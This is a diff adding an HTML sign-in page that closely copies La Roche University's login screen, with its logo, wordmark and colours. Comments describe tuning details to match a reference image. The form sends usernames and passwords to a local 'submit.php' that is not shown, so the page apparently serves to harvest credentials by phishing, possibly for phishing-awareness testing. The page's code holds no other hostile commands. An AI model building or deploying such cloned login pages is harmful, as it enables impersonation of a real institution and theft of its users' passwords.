@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>La Roche University - Sign in</title>
+  <!-- Roboto Slab SemiBold (600) matches the clean, medium-weight geometric slab serif in the reference -->
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Roboto+Slab:wght@600&display=swap" rel="stylesheet" />
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background-color: #2b2b2b;
+      background-image: url('https://ql6-docs-images.s3.amazonaws.com/test/img/3423/1747134438064.jpg');
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+      padding: 0 40px 40px;
+    }
+
+    /* Site Header */
+    .site-header {
+      width: 100%;
+      max-width: 1360px;
+      padding: 28px 0 36px;
+      display: flex;
+      align-items: center;
+    }
+
+    .brand-logo {
+      display: inline-flex;
+      align-items: center;
+      gap: 20px;
+      text-decoration: none;
+      color: #ffffff;
+    }
+
+    .brand-emblem {
+      width: 48px;
+      height: 55px;
+      flex-shrink: 0;
+      filter: drop-shadow(0 1px 3px rgba(0, 0, 0, 0.18));
+    }
+
+    .brand-wordmark {
+      font-family: 'Roboto Slab', Georgia, serif;
+      font-weight: 600;
+      font-size: clamp(22px, 3.6vw, 45px);
+      letter-spacing: 0.03em;
+      word-spacing: 0.08em;
+      line-height: 1;
+      color: #ffffff;
+      text-transform: uppercase;
+      /* Subtle horizontal expansion to match the exact proportion & length of the wordmark */
+      display: inline-block;
+      transform: scaleX(1.04);
+      transform-origin: left center;
+      text-shadow: 0 1px 4px rgba(0, 0, 0, 0.12);
+    }
+
+    /* Main Content Wrapper: Right-aligned on desktop */
+    .main-container {
+      width: 100%;
+      max-width: 1360px;
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: flex-end;
+    }
+
+    /* Login Card */
+    .login-card {
+      width: 100%;
+      max-width: 580px;
+      background-color: rgba(133, 27, 29, 0.96);
+      border-radius: 6px;
+      padding: 52px 52px 48px;
+      color: #ffffff;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.25);
+    }
+
+    h1 {
+      font-size: 32px;
+      font-weight: 400;
+      margin-bottom: 40px;
+      letter-spacing: -0.2px;
+    }
+
+    .form-group {
+      margin-bottom: 32px;
+    }
+
+    label {
+      display: block;
+      font-size: 16px;
+      font-weight: 400;
+      margin-bottom: 14px;
+      color: #ffffff;
+    }
+
+    .input-wrapper {
+      position: relative;
+      display: flex;
+      align-items: center;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      background: transparent;
+      border: none;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.75);
+      padding: 10px 40px 12px 16px;
+      font-size: 18px;
+      color: #ffffff;
+      outline: none;
+      transition: border-color 0.2s ease;
+    }
+
+    input::placeholder {
+      color: rgba(255, 255, 255, 0.42);
+      opacity: 1;
+    }
+
+    input:focus {
+      border-bottom: 2px solid #ffffff;
+      padding-bottom: 11px;
+    }
+
+    .toggle-password {
+      position: absolute;
+      right: 12px;
+      background: none;
+      border: none;
+      cursor: pointer;
+      color: #ffffff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 4px;
+    }
+
+    .toggle-password svg {
+      width: 22px;
+      height: 22px;
+      fill: currentColor;
+    }
+
+    .btn-submit {
+      margin-top: 8px;
+      background-color: #d6adae;
+      color: #1c2841;
+      border: none;
+      border-radius: 8px;
+      padding: 14px 42px;
+      font-size: 18px;
+      font-weight: 400;
+      cursor: pointer;
+      transition: background-color 0.2s ease, transform 0.1s ease;
+    }
+
+    .btn-submit:hover {
+      background-color: #e3c2c3;
+    }
+
+    .btn-submit:active {
+      transform: scale(0.99);
+    }
+
+    .helper-links {
+      margin-top: 26px;
+      padding-left: 14px;
+      font-size: 17px;
+      display: flex;
+      align-items: center;
+      gap: 14px;
+    }
+
+    .helper-links a {
+      color: #ffffff;
+      text-decoration: none;
+    }
+
+    .helper-links a:hover {
+      text-decoration: underline;
+    }
+
+    .divider {
+      color: rgba(255, 255, 255, 0.85);
+      user-select: none;
+    }
+
+    /* Tablet & Mobile: Center the form in the middle */
+    @media (max-width: 900px) {
+      body {
+        padding: 0 20px 36px;
+      }
+      .main-container {
+        justify-content: center;
+      }
+      .login-card {
+        max-width: 640px;
+      }
+    }
+
+    @media (max-width: 600px) {
+      .site-header {
+        padding: 20px 0 24px;
+      }
+      .brand-logo {
+        gap: 12px;
+      }
+      .brand-emblem {
+        width: 36px;
+        height: 42px;
+      }
+      .brand-wordmark {
+        transform: none;
+      }
+      .login-card {
+        padding: 36px 24px;
+      }
+      .helper-links {
+        flex-wrap: wrap;
+        padding-left: 0;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <header class="site-header">
+    <a href="#" class="brand-logo" aria-label="La Roche University Home">
+      <!-- Red Arch & White Fleur-de-lis Emblem -->
+      <svg class="brand-emblem" viewBox="0 0 84 96" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <!-- Red Arch Background -->
+        <path d="M0 42C0 18.804 18.804 0 42 0C65.196 0 84 18.804 84 42V96H0V42Z" fill="#B91C1C"/>
+        <!-- White Fleur-de-lis -->
+        <g fill="#FFFFFF">
+          <!-- Center Petal -->
+          <path d="M42 4C37 14 31 23 31 33C31 41 36 47 39.2 55H44.8C48 47 53 41 53 33C53 23 47 14 42 4Z"/>
+          <!-- Left Petal -->
+          <path d="M36.5 55C34.5 41 25 27 12.5 27C4.5 27 0 33 0 40.5C0 47.5 5.5 52 12 52C16.5 52 19.5 48.5 19.5 44.5C19.5 41.5 17.5 39 14.5 39C12 39 10.5 40.8 10.5 42.8C10.5 44.2 11.4 45.2 12.5 45.5C9.5 46 7.5 43.5 7.5 40.5C7.5 36.2 11 33.5 15.5 33.5C22.5 33.5 28.5 43 30.5 55H36.5Z"/>
+          <!-- Right Petal -->
+          <path d="M47.5 55C49.5 41 59 27 71.5 27C79.5 27 84 33 84 40.5C84 47.5 78.5 52 72 52C67.5 52 64.5 48.5 64.5 44.5C64.5 41.5 66.5 39 69.5 39C72 39 73.5 40.8 73.5 42.8C73.5 44.2 72.6 45.2 71.5 45.5C74.5 46 76.5 43.5 76.5 40.5C76.5 36.2 73 33.5 68.5 33.5C61.5 33.5 55.5 43 53.5 55H47.5Z"/>
+          <!-- Horizontal Tie Band -->
+          <rect x="24" y="55" width="36" height="5.5" rx="2.75"/>
+          <!-- Bottom Center Point -->
+          <path d="M38 60.5H46L44.5 82L42 93L39.5 82L38 60.5Z"/>
+          <!-- Bottom Left Curl -->
+          <path d="M36 60.5H29.5C28.5 69 24.5 75.5 18.5 77.5C15 78.7 13 76.5 13 73.8C13 71.5 14.8 69.8 17 69.8C18.5 69.8 19.6 70.7 20 71.8C20.5 69.2 18.5 66.8 15.5 66.8C11.5 66.8 8.5 70.2 8.5 74.5C8.5 79.5 12.8 83.2 18.5 83.2C27.5 83.2 34.5 73.5 36 60.5Z"/>
+          <!-- Bottom Right Curl -->
+          <path d="M48 60.5H54.5C55.5 69 59.5 75.5 65.5 77.5C69 78.7 71 76.5 71 73.8C71 71.5 69.2 69.8 67 69.8C65.5 69.8 64.4 70.7 64 71.8C63.5 69.2 65.5 66.8 68.5 66.8C72.5 66.8 75.5 70.2 75.5 74.5C75.5 79.5 71.2 83.2 65.5 83.2C56.5 83.2 49.5 73.5 48 60.5Z"/>
+        </g>
+      </svg>
+      <span class="brand-wordmark">La Roche University</span>
+    </a>
+  </header>
+
+  <main class="main-container">
+    <section class="login-card">
+      <h1>Sign in</h1>
+
+      <form id="signin-form" action="submit.php" method="POST">
+        <div class="form-group">
+          <label for="username">Username</label>
+          <div class="input-wrapper">
+            <input
+              type="text"
+              id="username"
+              name="username"
+              placeholder="Enter username"
+              required
+            />
+          </div>
+        </div>
+
+        <div class="form-group">
+          <label for="password">Password</label>
+          <div class="input-wrapper">
+            <input
+              type="password"
+              id="password"
+              name="password"
+              placeholder="Enter password"
+              required
+            />
+            <button
+              type="button"
+              class="toggle-password"
+              id="togglePassword"
+              aria-label="Toggle password visibility"
+            >
+              <svg id="eyeIcon" viewBox="0 0 24 24">
+                <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
+              </svg>
+            </button>
+          </div>
+        </div>
+
+        <button type="submit" class="btn-submit">Sign in</button>
+
+        <div class="helper-links">
+          <a href="#forgot-password">Forgot Password</a>
+          <span class="divider">|</span>
+          <a href="#forgot-username">Forgot Username</a>
+        </div>
+      </form>
+    </section>
+  </main>
+
+  <script>
+    const togglePasswordBtn = document.getElementById('togglePassword');
+    const passwordInput = document.getElementById('password');
+    const eyeIcon = document.getElementById('eyeIcon');
+
+    const eyeOpenPath = "M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z";
+    const eyeSlashPath = "M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z";
+
+    togglePasswordBtn.addEventListener('click', () => {
+      const isPassword = passwordInput.getAttribute('type') === 'password';
+      passwordInput.setAttribute('type', isPassword ? 'text' : 'password');
+      eyeIcon.innerHTML = `<path d="${isPassword ? eyeSlashPath : eyeOpenPath}"/>`;
+    });
+  </script>
+
+</body>
+</html>
